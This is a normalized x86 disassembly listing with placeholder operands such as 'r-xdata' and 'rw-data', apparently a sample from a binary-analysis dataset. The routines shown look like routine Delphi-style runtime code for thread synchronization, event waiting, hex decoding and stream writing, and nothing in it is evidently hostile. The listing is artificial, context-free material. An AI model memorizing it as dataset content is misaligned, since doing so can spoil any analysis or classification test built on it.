mov edx r-xdata
mov eax [ ebp - 0x1c ]
call sub_40f8f0
test al al
jne r-xdata
mov eax [ ebp - 0x1c ]
movzx eax [ eax + 0x4 ]
mov [ ebx ] ax
mov edx ebx
mov ecx [ ebp - 0x10 ]
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41ccf6
mov eax [ ebp - 0x14 ]
call sub_403f64
retn
sub_41cd58
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41cf6a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_4113e0
mov eax [ ebp - 0x4 ]
call sub_41aaf4
and eax 0x7f
cmp eax 0x15
ja r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40dc70
call sub_4047d8
jmp [ eax * 4 + jump_table_41cd9a ]
mov eax [ ebp - 0x4 ]
call sub_41c62c
cmp al 0xd
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_41b700
mov edx eax
movsx edx dl
mov eax ebx
mov cl 0xff
call sub_4126b0
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41b700
mov edx eax
movsx edx dx
mov eax ebx
mov cl 0xfe
call sub_4126b0
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41b700
mov edx eax
mov eax ebx
mov cl 0xfc
call sub_4126b0
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41b4b0
mov eax ebx
call sub_412740
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41b52c
mov eax ebx
call sub_412740
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41b4e8
mov eax ebx
call sub_412740
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41b570
mov eax ebx
call sub_412768
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41b5c0
mov eax ebx
call sub_412754
jmp r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_41c48c
mov edx [ ebp - 0x8 ]
mov eax ebx
call sub_41277c
jmp r-xdata
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_41c548
mov edx [ ebp - 0xc ]
mov eax ebx
call sub_4127a8
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41c62c
cmp al 0x9
sete dl
mov eax ebx
call sub_412718
jmp r-xdata
push ebp
lea eax [ ebp - 0x1c ]
call sub_41cb90
pop ecx
lea edx [ ebp - 0x1c ]
mov eax ebx
call sub_411708
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41b76c
push edx
push eax
mov eax ebx
call sub_4126ec
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41cf71
lea eax [ ebp - 0x1c ]
call sub_4113f4
lea eax [ ebp - 0xc ]
call sub_40566c
lea eax [ ebp - 0x8 ]
call sub_404e44
retn
mov eax ebx
call sub_412f64
jmp r-xdata
sub_41cf78
push esi
push edi
push ebx
mov esi edx
mov ebx ecx
mov edi eax
jmp r-xdata
or ebx ebx
jne r-xdata
mov ecx [ edi + 0xc ]
sub ecx [ edi + 0x10 ]
ja r-xdata
pop ebx
pop edi
pop esi
retn
cmp ecx ebx
jb r-xdata
mov eax edi
call sub_41cfc4
mov ecx [ edi + 0xc ]
sub ebx ecx
push edi
mov eax [ edi + 0x8 ]
add eax [ edi + 0x10 ]
add [ edi + 0x10 ] ecx
mov edi eax
mov edx ecx
shr ecx 0x2
cld
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
pop edi
mov ecx ebx
sub_41cff0
push ebx
push ecx
mov [ esp ] edx
mov ebx eax
cmp [ esp ] 0xffffff80
jl r-xdata
cmp [ esp ] 0xffff8000
jl r-xdata
cmp [ esp ] 0x7f
jg r-xdata
mov dl 0x4
mov eax ebx
call sub_41d174
mov edx esp
mov ecx 0x4
mov eax ebx
call sub_41cf78
cmp [ esp ] 0x7fff
jg r-xdata
mov dl 0x2
mov eax ebx
call sub_41d174
mov edx esp
mov ecx 0x1
mov eax ebx
call sub_41cf78
pop edx
pop ebx
retn
mov dl 0x3
mov eax ebx
call sub_41d174
mov edx esp
mov ecx 0x2
mov eax ebx
call sub_41cf78
jmp r-xdata
pop edx
pop ebx
retn
sub_41d074
push ebx
push esi
push edi
add esp 0xfffffff8
mov edi ecx
mov esi edx
mov ebx eax
mov eax esi
mov edx edi
call sub_405270
je r-xdata
mov eax esi
test eax eax
je r-xdata
mov [ esp + 0x4 ] edi
mov eax [ esp + 0x4 ]
test eax eax
je r-xdata
mov [ esp ] eax
cmp [ esp ] 0xff
jg r-xdata
sub eax 0x4
mov eax [ eax ]
mov [ esp ] eax
mov dl 0x14
mov eax ebx
call sub_41d174
mov edx esp
mov ecx 0x4
mov eax ebx
call sub_41cf78
mov edx edi
mov ecx [ esp ]
mov eax ebx
call sub_41cf78
jmp r-xdata
sub eax 0x4
mov eax [ eax ]
mov dl 0xc
mov eax ebx
call sub_41d174
mov edx esp
mov ecx 0x4
mov eax ebx
call sub_41cf78
mov dl 0x6
mov eax ebx
call sub_41d174
mov edx esp
mov ecx 0x1
mov eax ebx
call sub_41cf78
jmp r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
mov edx esi
mov ecx [ esp ]
mov eax ebx
call sub_41cf78
sub_41d120
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_41d165
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_406f84
mov ecx [ ebp - 0x4 ]
mov edx esi
mov eax ebx
call sub_41d074
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41d16c
lea eax [ ebp - 0x4 ]
call sub_404e44
retn
sub_41d188
push esi
push edi
push ebp
mov ebp ecx
mov esi eax
mov edi ebp
test edi edi
jle r-xdata
mov eax ebp
sub eax edi
pop ebp
pop edi
pop esi
retn
movzx eax [ esi ]
mov ecx eax
add cl 0xd0
sub cl 0x37
jae r-xdata
movzx ecx [ esi + 0x1 ]
add cl 0xd0
sub cl 0x37
jae r-xdata
movzx eax al
movzx eax [ eax * 2 + rw-data ]
shl eax 0x4
movzx ecx [ esi + 0x1 ]
movzx ecx [ ecx * 2 + rw-data ]
add al cl
mov [ edx ] al
inc edx
add esi 0x2
dec edi
test edi edi
jg r-xdata
sub_41d278
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov ebx eax
call GetCurrentThreadId
mov edx [ rw-data ]
cmp eax [ edx ]
je r-xdata
test ebx ebx
jle r-xdata
call GetCurrentThreadId
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] 0x0
lea eax [ ebp - 0x14 ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40dcac
call sub_4047d8
call sub_41d22c
mov eax ebx
call sub_41d238
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0xc ]
cmp [ eax + 0x8 ] 0x0
jg r-xdata
xor eax eax
mov [ ebp - 0xc ] eax
push rw-data
call EnterCriticalSection
xor eax eax
push ebp
push sub_41d43d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
push eax
push rw-data
call InterlockedExchange
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_41d41e
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov [ ebp - 0x1 ] al
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov al 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41d425
mov eax [ ebp - 0xc ]
call sub_403f64
retn
jmp r-xdata
mov eax [ ebp - 0xc ]
cmp [ eax + 0x8 ] 0x0
jg r-xdata
xor edx edx
mov eax [ ebp - 0xc ]
call sub_4167c8
mov [ ebp - 0x8 ] eax
xor edx edx
mov eax [ ebp - 0xc ]
call sub_4166b4
push rw-data
call LeaveCriticalSection
xor eax eax
push ebp
push sub_41d3c1
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_41d382
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
mov eax [ ebx + 0xc ]
call [ ebx + 0x8 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41d3c8
push rw-data
call EnterCriticalSection
retn
sub_41d3c8
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov edx 0x18
call sub_402d44
mov edx 0xc
mov eax [ ebp - 0x8 ]
call sub_402d44
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
push eax
call SetEvent
jmp r-xdata
xor edx edx
mov eax [ ebp - 0xc ]
call sub_4167c8
mov [ ebp - 0x8 ] eax
xor edx edx
mov eax [ ebp - 0xc ]
call sub_4166b4
push rw-data
call LeaveCriticalSection
xor eax eax
push ebp
push sub_41d3c1
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_41d382
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
mov eax [ ebx + 0xc ]
call [ ebx + 0x8 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41d425
mov eax [ ebp - 0xc ]
call sub_403f64
retn
mov eax [ ebp - 0xc ]
cmp [ eax + 0x8 ] 0x0
jg r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41d3c8
push rw-data
call EnterCriticalSection
retn
sub_41d450
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xd ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
movzx ebx [ eax + 0xf ]
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x14 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx ]
mov eax [ ebp - 0x4 ]
mov [ eax + 0x10 ] 0x1
call sub_41d254
test bl bl
je r-xdata
xor eax eax
push ebp
push sub_41d491
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x4 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax esi
call sub_404e28
mov eax [ ebp - 0x4 ]
call sub_403f64
sub_41d496
call sub_402dec
mov edx [ ebp - 0x4 ]
mov [ edx + 0x38 ] eax
call sub_404854
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
movzx ebx [ eax + 0xf ]
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x14 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx ]
mov eax [ ebp - 0x4 ]
mov [ eax + 0x10 ] 0x1
call sub_41d254
test bl bl
je r-xdata
mov eax esi
call sub_404e28
mov eax [ ebp - 0x4 ]
call sub_403f64
sub_41d4f8
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x10 ] ebx
test dl dl
je r-xdata
mov ebx ecx
mov [ ebp - 0x1 ] dl
mov esi eax
xor eax eax
push ebp
push sub_41d5a2
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
mov eax esi
call sub_403f34
call sub_41d260
mov [ esi + 0xe ] bl
mov [ esi + 0xc ] bl
push esi
push 0x4
lea eax [ esi + 0x8 ]
push eax
mov ecx sub_41d450
xor edx edx
xor eax eax
call sub_404dc8
mov ebx eax
mov [ esi + 0x4 ] ebx
test ebx ebx
jne r-xdata
add esp 0xfffffff0
call sub_404288
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41d5a9
lea eax [ ebp - 0x10 ]
call sub_404e44
retn
call GetLastError
lea edx [ ebp - 0x10 ]
call sub_40d3a0
mov eax [ ebp - 0x10 ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0xb
lea eax [ ebp - 0xc ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40dcac
call sub_4047d8
sub_41d5c8
push ebx
push esi
call sub_404330
mov ebx edx
mov esi eax
cmp [ esi + 0x8 ] 0x0
je r-xdata
push 0x0
push 0x0
mov eax [ esi ]
mov edx esi
call sub_41d704
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
cmp [ esi + 0x10 ] 0x0
jne r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403f54
mov eax [ esi + 0x38 ]
call sub_403f64
call sub_41d26c
test bl bl
jle r-xdata
push eax
call CloseHandle
mov eax esi
call sub_41d9b0
cmp [ esi + 0xc ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4042d8
mov eax esi
call sub_41d9b8
mov eax esi
call sub_41d988
sub_41d648
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov ebx edx
xor eax eax
push ebp
push sub_41d6b6
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41d6bd
lea eax [ ebp - 0x14 ]
call sub_404e44
retn
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_40d3a0
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x10 ]
push eax
push 0x1
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40dcac
call sub_4047d8
sub_41d704
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi edx
push rw-data
call EnterCriticalSection
xor eax eax
push ebp
push sub_41d7b6
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41d7bd
push rw-data
call LeaveCriticalSection
retn
mov eax [ rw-data ]
mov esi [ eax + 0x8 ]
dec esi
cmp esi 0x0
jl r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_4167c8
mov ebx eax
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
dec esi
cmp esi 0xffffffff
jne r-xdata
test edi edi
je r-xdata
cmp [ ebp + 0xa ] 0x0
je r-xdata
mov eax [ ebx ]
cmp edi [ eax ]
je r-xdata
mov eax [ ebx ]
mov eax [ eax + 0x8 ]
cmp eax [ ebp + 0x8 ]
jne r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_4166b4
mov eax [ ebx ]
mov edx 0x18
call sub_402d44
mov edx 0xc
mov eax ebx
call sub_402d44
mov eax [ ebx ]
mov eax [ eax + 0xc ]
cmp eax [ ebp + 0xc ]
jne r-xdata
sub_41d7c4
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov [ ebp - 0x5 ] cl
mov [ ebp - 0x4 ] edx
call GetCurrentThreadId
mov edx [ rw-data ]
cmp eax [ edx ]
jne r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov ebx [ ebp - 0x4 ]
mov eax [ ebx + 0xc ]
call [ ebx + 0x8 ]
jmp r-xdata
lea eax [ ebp - 0x18 ]
mov [ ebp - 0xc ] eax
mov eax 0xc
call sub_402d28
mov [ ebp - 0xc ] eax
jmp r-xdata
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0xc ]
xor edx edx
mov [ eax + 0x8 ] edx
push 0x0
push 0x0
push 0xffffffff
push 0x0
call CreateEventA
mov edx [ ebp - 0xc ]
mov [ edx + 0x8 ] eax
jmp r-xdata
movzx ebx [ ebp - 0x5 ]
xor bl 0x1
test bl bl
je r-xdata
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
mov [ eax ] edx
mov edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_416668
call sub_41d254
cmp [ rw-data ] 0x0
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403f34
mov [ rw-data ] eax
xor eax eax
push ebp
push sub_41d93a
push [ fs : eax ]
mov [ fs : eax ] esp
push rw-data
call EnterCriticalSection
xor eax eax
push ebp
push sub_41d913
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
movzx edx [ ebp - 0x5 ]
mov [ eax + 0x4 ] dl
cmp [ rw-data ] 0x0
jne r-xdata
test bl bl
je r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax ]
mov edx [ eax ]
mov eax [ rw-data ]
call [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41d91a
push rw-data
call LeaveCriticalSection
retn
push rw-data
call LeaveCriticalSection
xor eax eax
push ebp
push sub_41d8f4
push [ fs : eax ]
mov [ fs : eax ] esp
push 0xffffffff
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x8 ]
push eax
call WaitForSingleObject
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
push rw-data
call EnterCriticalSection
retn
sub_41d91a
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp - 0x5 ] 0x0
jne r-xdata
retn
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x8 ]
push eax
call CloseHandle
sub_41d960
push ebp
mov ebp esp
mov [ eax + 0x20 ] eax
xor edx edx
mov [ eax + 0x30 ] edx
mov edx [ ebp + 0x8 ]
mov [ eax + 0x28 ] edx
mov edx [ ebp + 0xc ]
mov [ eax + 0x2c ] edx
lea edx [ eax + 0x20 ]
xor ecx ecx
mov eax [ eax ]
call sub_41d7c4
pop ebp
retn 0x8
sub_41d988
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x4 ]
push eax
call ResumeThread
mov esi eax
test esi esi
setge dl
mov eax ebx
call sub_41d6c4
dec esi
jne r-xdata
pop esi
pop ebx
retn
mov [ ebx + 0xe ] 0x0
sub_41d9b8
push ebx
push esi
add esp 0xffffffd8
mov esi eax
mov eax [ esi + 0x4 ]
mov [ esp + 0x4 ] eax
call GetCurrentThreadId
mov edx [ rw-data ]
cmp eax [ edx ]
jne r-xdata
push 0xffffffff
mov eax [ esp + 0x8 ]
push eax
call WaitForSingleObject
xor ebx ebx
mov eax [ rw-data ]
mov [ esp + 0x8 ] eax
push 0x40
push 0x3e8
push 0x0
lea eax [ esp + 0x10 ]
push eax
push 0x2
call MsgWaitForMultipleObjects
mov ebx eax
cmp ebx 0xffffffff
setne dl
mov eax esi
call sub_41d6c4
cmp ebx 0x1
jne r-xdata
push 0x0
push 0x0
push 0x0
push 0x0
lea eax [ esp + 0x1c ]
push eax
call PeekMessageA
test ebx ebx
jne r-xdata
xor eax eax
call sub_41d278
cmp ebx 0x2
jne r-xdata
jmp r-xdata
push esp
mov eax [ esp + 0x8 ]
push eax
call GetExitCodeThread
cmp eax 0x1
sbb edx edx
inc edx
mov eax esi
call sub_41d6c4
mov eax [ esp ]
add esp 0x28
pop esi
pop ebx
retn
sub_41da5c
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
movzx eax [ r-xdata ]
mov [ edi + 0x24 ] al
test esi esi
je r-xdata
add esp 0xfffffff0
call sub_404288
mov eax edi
test bl bl
je r-xdata
mov edx edi
mov eax esi
call sub_41dc18
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4042e0
pop [ fs : 0x0 ]
add esp 0xc
sub_41daa8
push ebx
push esi
push ecx
call sub_404330
mov [ esp ] dl
mov ebx eax
mov eax ebx
call sub_41dd10
cmp [ ebx + 0x14 ] 0x0
je r-xdata
mov eax ebx
call sub_41dcb4
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
jmp r-xdata
movzx edx [ esp ]
and dl 0xfc
mov eax ebx
call sub_416d9c
cmp [ esp ] 0x0
jle r-xdata
mov edx ebx
call sub_41dc7c
mov esi [ ebx + 0x14 ]
test esi esi
je r-xdata
pop edx
pop esi
pop ebx
retn
mov eax ebx
call sub_4042d8
lea eax [ ebx + 0x14 ]
call sub_40f8bc
cmp [ esi + 0x8 ] 0x0
jg r-xdata
mov edx [ esi + 0x8 ]
dec edx
mov eax esi
call sub_4167c8
mov cl 0x1
mov edx ebx
mov esi [ eax ]
call [ esi + 0x10 ]
sub_41db30
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
cmp [ ebx + 0x14 ] 0x0
jne r-xdata
cmp eax [ esi + 0x4 ]
je r-xdata
mov edx esi
mov eax [ ebx + 0x14 ]
call sub_416824
test eax eax
jge r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403f34
mov [ ebx + 0x14 ] eax
or [ ebx + 0x1c ] 0x100
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x14 ]
call sub_416668
mov edx ebx
mov eax esi
call sub_41db30
sub_41dbc4
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x10 ] 0x0
jne r-xdata
mov edx esi
mov eax [ ebx + 0x10 ]
call sub_416668
mov [ esi + 0x4 ] ebx
pop esi
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403f34
mov [ ebx + 0x10 ] eax
sub_41dbf0
push ebx
mov ebx eax
xor eax eax
mov [ edx + 0x4 ] eax
mov eax [ ebx + 0x10 ]
call sub_416964
mov eax [ ebx + 0x10 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
pop ebx
retn
call sub_403f64
xor eax eax
mov [ ebx + 0x10 ] eax
sub_41dc18
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov edx edi
mov eax ebx
mov si 0xfff5
call sub_404160
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
mov eax [ ebx + 0x8 ]
push eax
xor ecx ecx
mov edx ebx
mov eax edi
mov esi [ eax ]
call [ esi + 0x20 ]
mov edx ebx
mov eax edi
call sub_41dbc4
mov dl 0x1
mov eax ebx
call sub_41e150
test [ edi + 0x1c ] 0x10
je r-xdata
mov edx ebx
call sub_41dc7c
xor ecx ecx
mov edx ebx
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x10 ]
pop edi
pop esi
pop ebx
retn
mov cl 0x1
mov dl 0x1
mov eax ebx
call sub_41e100
sub_41dc7c
push ebx
push esi
push edi
mov ebx edx
mov esi eax
push 0x0
mov ecx [ ebx + 0x8 ]
mov edx ebx
mov eax esi
mov edi [ eax ]
call [ edi + 0x20 ]
mov cl 0x1
mov edx ebx
mov eax esi
mov edi [ eax ]
call [ edi + 0x10 ]
xor edx edx
mov eax ebx
call sub_41e150
mov edx ebx
mov eax esi
call sub_41dbf0
pop edi
pop esi
pop ebx
retn
sub_41dcb4
push ebx
push esi
push edi
mov esi eax
jmp r-xdata
mov ebx [ esi + 0x10 ]
test ebx ebx
jne r-xdata
mov eax ebx
call sub_4168b0
mov edi eax
test [ edi + 0x1d ] 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax esi
call sub_41dc7c
jmp r-xdata
movzx eax [ r-xdata ]
and ax [ esi + 0x1c ]
movzx edx [ r-xdata ]
cmp dx ax
jne r-xdata
mov dl 0x1
mov eax edi
mov ecx [ eax ]
call [ ecx - 0x4 ]
mov edx edi
mov eax esi
call sub_41dbf0
sub_41dd10
push ebx
push esi
push edi
mov ebx eax
test [ ebx + 0x1c ] 0x8
jne r-xdata
pop edi
pop esi
pop ebx
retn
or [ ebx + 0x1c ] 0x8
mov eax [ ebx + 0x10 ]
test eax eax
je r-xdata
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
mov edx edi
mov eax [ ebx + 0x10 ]
call sub_4167c8
call sub_41dd10
inc edi
dec esi
jne r-xdata
sub_41dd4c
push ebx
mov ebx eax
mov eax [ ebx + 0x14 ]
test eax eax
je r-xdata
pop ebx
retn
call sub_416964
mov eax [ ebx + 0x14 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
call sub_403f64
xor eax eax
mov [ ebx + 0x14 ] eax
sub_41dd70
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_41dd4c
mov edx ebx
mov eax esi
call sub_41dd4c
pop esi
pop ebx
retn
sub_41dd8c
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] cl
mov edi edx
mov esi eax
cmp [ esp ] 0x1
jne r-xdata
mov eax [ esi + 0x10 ]
test eax eax
je r-xdata
test edi edi
je r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov edx edi
mov eax esi
call sub_41dd70
mov edx ebx
mov eax [ esi + 0x10 ]
call sub_4167c8
movzx ecx [ esp ]
mov edx edi
mov ebp [ eax ]
call [ ebp + 0x10 ]
dec ebx
mov eax [ esi + 0x10 ]
cmp ebx [ eax + 0x8 ]
jl r-xdata
test ebx ebx
jge r-xdata
mov eax [ esi + 0x10 ]
mov ebx [ eax + 0x8 ]
dec ebx
sub_41ddec
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax [ esi + 0x20 ]
test eax eax
je r-xdata
push ebx
push sub_41db84
push ebx
push sub_41dbac
movzx eax [ ebx + 0x18 ]
cmp ax [ ebp - 0x4 ]
setne cl
mov edx r-xdata
mov eax esi
mov edi [ eax ]
call [ edi + 0x4 ]
push ebx
push sub_41db98
push ebx
push sub_41dbb8
movzx eax [ ebp - 0x2 ]
cmp ax [ ebx + 0x1a ]
setne cl
mov edx r-xdata
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ eax + 0x18 ]
mov [ ebp - 0x4 ] eax
sub_41dee4
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov esi [ ebp + 0x8 ]
test edi edi
je r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_4092e0
test al al
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
cmp [ ebx + 0x4 ] 0x0
je r-xdata
cmp ebx [ edi + 0x4 ]
jne r-xdata
push esi
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax [ ebx + 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x20 ]
mov edx esi
mov eax ebx
call sub_41df7c
test eax eax
je r-xdata
mov [ ebp - 0xc ] esi
mov [ ebp - 0x8 ] 0xb
lea eax [ ebp - 0xc ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40dcac
call sub_4047d8
sub_41df7c
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov edi eax
cmp [ esp ] 0x0
je r-xdata
xor esi esi
cmp [ edi + 0x10 ] 0x0
je r-xdata
mov eax [ edi + 0x10 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor ebp ebp
mov eax esi
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebp
dec ebx
jne r-xdata
mov eax [ edi + 0x10 ]
mov edx ebp
call sub_4167c8
mov esi eax
mov eax [ esi + 0x8 ]
mov edx [ esp ]
call sub_4092e0
test al al
jne r-xdata
sub_41dfcc
push ebx
push esi
push edi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov eax [ ebx + 0x8 ]
mov edx esi
call sub_405270
je r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
test esi esi
je r-xdata
mov edi [ ebx + 0x4 ]
test edi edi
je r-xdata
xor edx edx
mov eax esi
call sub_409764
test al al
jne r-xdata
push esi
mov ecx [ ebx + 0x8 ]
xor edx edx
mov eax ebx
mov edi [ eax ]
call [ edi + 0x20 ]
push esi
mov ecx [ ebx + 0x8 ]
mov edx ebx
mov eax edi
mov edi [ eax ]
call [ edi + 0x20 ]
jmp r-xdata
mov [ esp ] esi
mov [ esp + 0x4 ] 0xb
push esp
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40dcac
call sub_4047d8
xor edx edx
mov eax ebx
call sub_41e150
mov edx esi
mov eax ebx
call sub_41e05c
mov dl 0x1
mov eax ebx
call sub_41e150
sub_41e070
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x10 ] 0x0
jne r-xdata
mov edx esi
mov eax [ ebx + 0x10 ]
